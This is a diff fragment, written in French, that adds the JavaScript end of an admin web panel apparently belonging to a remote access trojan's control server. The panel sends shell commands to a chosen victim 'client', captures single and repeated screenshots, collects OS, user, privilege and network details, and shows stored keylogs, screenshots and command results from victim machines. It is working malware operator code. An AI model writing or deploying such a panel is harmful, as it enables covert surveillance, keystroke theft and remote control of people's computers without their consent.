+            if (!cmd || !selectedClient) return showAlert('Entrez une commande', 'error');
+            
+            try {
+                showAlert('Exécution de la commande...', 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'execute_command', data: {command: cmd}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    const output = document.getElementById('shell-output');
+                    output.textContent += `\n$ ${cmd}\n${JSON.stringify(result, null, 2)}\n`;
+                    showAlert('Commande exécutée', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        function clearShellOutput() {
+            document.getElementById('shell-output').textContent = '';
+        }
+        
+        // ==================== SCREENSHOT ====================
+        
+        async function takeScreenshot() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                showAlert('Capture en cours...', 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'take_screenshot'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    if (result.screenshot) {
+                        const img = document.createElement('img');
+                        img.src = 'data:image/png;base64,' + result.screenshot;
+                        img.style.maxWidth = '100%';
+                        img.style.marginTop = '15px';
+                        img.style.border = '2px solid #667eea';
+                        img.style.borderRadius = '8px';
+                        document.getElementById('screenshot-output').innerHTML = '';
+                        document.getElementById('screenshot-output').appendChild(img);
+                        showAlert('Screenshot capturé', 'success');
+                    } else {
+                        document.getElementById('screenshot-output').textContent = JSON.stringify(result, null, 2);
+                    }
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function takeMultipleScreenshots() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            const count = parseInt(document.getElementById('screenshot-count').value);
+            const interval = parseInt(document.getElementById('screenshot-interval').value);
+            
+            showAlert(`Capture de ${count} screenshots...`, 'info');
+            document.getElementById('screenshot-output').innerHTML = '<div>Captures en cours...</div>';
+            
+            for (let i = 0; i < count; i++) {
+                await new Promise(resolve => setTimeout(resolve, interval * 1000));
+                await takeScreenshot();
+            }
+            
+            showAlert(`${count} screenshots capturés`, 'success');
+        }
+        
+        async function viewScreenshotsDB() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/screenshots`);
+                const data = await response.json();
+                
+                const output = document.getElementById('screenshot-output');
+                output.innerHTML = '';
+                
+                if (data.screenshots && data.screenshots.length > 0) {
+                    data.screenshots.slice(0, 10).forEach(shot => {
+                        const div = document.createElement('div');
+                        div.style.marginBottom = '15px';
+                        div.innerHTML = `
+                            <div><strong>Client:</strong> ${shot.client_id.slice(0, 8)} | 
+                            <strong>Date:</strong> ${shot.timestamp}</div>
+                            <img src="data:image/png;base64,${shot.screenshot_data}" 
+                                 style="max-width: 100%; margin-top: 5px; border: 2px solid #667eea; border-radius: 8px;">
+                        `;
+                        output.appendChild(div);
+                    });
+                } else {
+                    output.textContent = 'Aucun screenshot dans la base de données';
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        // ==================== SYSTEM INFO ====================
+        
+        async function getDetailedSystemInfo(infoType) {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            const actions = {
+                'os': 'get_os_info',
+                'architecture': 'get_architecture_info',
+                'user': 'get_user_info',
+                'privileges': 'get_privileges_info',
+                'network': 'get_network_info'
+            };
+            
+            const action = actions[infoType];
+            if (!action) return;
+            
+            try {
+                showAlert(`Récupération ${infoType}...`, 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: action})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('system-detailed-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Informations chargées', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        // ==================== DATABASE FUNCTIONS ====================
+        
+        async function loadDBClients() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/clients`);
+                const data = await response.json();
+                
+                if (data.clients) {
+                    let html = '<table><thead><tr><th>Client ID</th><th>IP</th><th>Hostname</th><th>Platform</th><th>First Seen</th><th>Last Seen</th></tr></thead><tbody>';
+                    data.clients.forEach(client => {
+                        html += `<tr>
+                            <td>${client.client_id.slice(0, 12)}</td>
+                            <td>${client.ip_address || 'N/A'}</td>
+                            <td>${client.hostname || 'N/A'}</td>
+                            <td>${client.platform || 'N/A'}</td>
+                            <td>${client.first_seen || 'N/A'}</td>
+                            <td>${client.last_seen || 'N/A'}</td>
+                        </tr>`;
+                    });
+                    html += '</tbody></table>';
+                    document.getElementById('db-clients-output').innerHTML = html;
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function loadDBKeylogs() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/keylogs`);
+                const data = await response.json();
+                
+                if (data.keylogs) {
+                    let html = '<table><thead><tr><th>Client</th><th>Timestamp</th><th>Keystrokes</th></tr></thead><tbody>';
+                    data.keylogs.slice(0, 100).forEach(log => {
+                        html += `<tr>
+                            <td>${log.client_id.slice(0, 8)}</td>
+                            <td>${log.timestamp}</td>
+                            <td>${log.keystrokes.slice(0, 100)}</td>
+                        </tr>`;
+                    });
+                    html += '</tbody></table>';
+                    document.getElementById('db-keylogs-output').innerHTML = html;
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function loadDBCommands() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/commands`);
+                const data = await response.json();
+                
+                if (data.commands) {
+                    let html = '<table><thead><tr><th>ID</th><th>Client</th><th>Command</th><th>Status</th><th>Timestamp</th></tr></thead><tbody>';
+                    data.commands.slice(0, 100).forEach(cmd => {
+                        html += `<tr>
+                            <td>${cmd.command_id.slice(0, 8)}</td>
+                            <td>${cmd.client_id.slice(0, 8)}</td>
+                            <td>${cmd.command_type}</td>
+                            <td>${cmd.status}</td>
+                            <td>${cmd.created_at}</td>
+                        </tr>`;
+                    });
+                    html += '</tbody></table>';
+                    document.getElementById('db-commands-output').innerHTML = html;
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function loadDBResults() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/command_results`);
+                const data = await response.json();
+                
+                if (data.results) {
+                    let html = '<table><thead><tr><th>Command ID</th><th>Result</th><th>Timestamp</th></tr></thead><tbody>';
+                    data.results.slice(0, 100).forEach(res => {
+                        const resultPreview = JSON.stringify(res.result_data).slice(0, 100);
+                        html += `<tr>
+                            <td>${res.command_id.slice(0, 8)}</td>
+                            <td>${resultPreview}...</td>
+                            <td>${res.timestamp}</td>
+                        </tr>`;
+                    });
+                    html += '</tbody></table>';
+                    document.getElementById('db-results-output').innerHTML = html;
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function loadDBScreenshots() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/screenshots`);
+                const data = await response.json();
+                
+                const output = document.getElementById('db-screenshots-output');
+                output.innerHTML = '';
+                
+                if (data.screenshots && data.screenshots.length > 0) {
+                    data.screenshots.slice(0, 20).forEach(shot => {
+                        const div = document.createElement('div');
+                        div.style.marginBottom = '20px';
+                        div.innerHTML = `
+                            <div><strong>Client:</strong> ${shot.client_id.slice(0, 8)} | 
+                            <strong>Date:</strong> ${shot.timestamp}</div>
+                            <img src="data:image/png;base64,${shot.screenshot_data}" 
+                                 style="max-width: 100%; margin-top: 5px; border: 1px solid #ddd; border-radius: 5px;">
+                        `;
+                        output.appendChild(div);
+                    });
+                } else {
+                    output.innerHTML = '<div class="alert alert-info">Aucun screenshot dans la base de données</div>';
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        function loadAnalytics() {
+            showAlert('Chargement des analytiques...', 'info');
+            // TODO: Implement analytics
+        }
+        
+        // ==================== HELPER FUNCTIONS ====================
+        
+        async function waitForResult(commandId, callback) {
+            for (let i = 0; i < 24; i++) {
+                await new Promise(resolve => setTimeout(resolve, 2500));
+                
+                try {
+                    const response = await fetch(`${API_BASE}/admin/command_result/${commandId}`);
+                    if (response.status === 200) {
+                        const data = await response.json();
+                        if (data.result) {
+                            callback(data.result);
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.error('Error waiting for result:', error);
+                }
+            }
+            
+            showAlert('Timeout waiting for result', 'error');
+        }
+        
+        function formatSize(bytes) {
+            if (!bytes) return '0 B';
+            const units = ['B', 'KB', 'MB', 'GB', 'TB'];
+            let size = bytes;
+            let unitIndex = 0;
+            while (size >= 1024 && unitIndex < units.length - 1) {
+                size /= 1024;
+                unitIndex++;
+            }
+            return `${size.toFixed(2)} ${units[unitIndex]}`;
+        }
+    </script>
+</body>
+</html>
